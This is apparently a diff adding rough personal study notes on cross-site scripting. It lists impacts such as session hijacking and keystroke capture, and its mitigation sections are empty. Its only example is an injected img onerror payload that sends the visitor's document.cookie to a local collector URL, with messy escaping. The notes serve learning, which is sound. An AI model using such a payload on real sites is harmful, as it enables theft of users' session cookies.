@@ -1,0 +1,28 @@
+XSS(CRoss Side Scripting) - Someone is able to inject javascript into your website and can
+    do something.
+
+
+    How these things can happen?
+    Mitigation
+
+
+
+    Vulnerability because of XSS                                              Mitigations
+
+        a)User Session Hijacking
+        b)Unauthorization Activities(sending message)
+        c)Capturing Keystrokes
+        d)Stealing critical information(taking screenshot of DOM)
+        e)Phishing Attack - Using injection I injected a form
+            and that form does something the hood for you.
+
+
+    now a days you cannot pass a script tag or write js that will get attached or script
+    will be xecuted directly. In past this used to happen. but this a hack, here we are 
+    passing a image tag- 
+
+    ?name=<img src=\"does-not-exist\" onerror=\"var img = document.createElement('\img\');img.src="\http://127.0.0.1:5501/cookie?data=${document.cookie}`;document.querySelector(\'body\').appendChild(img);\">
+
+
+
+
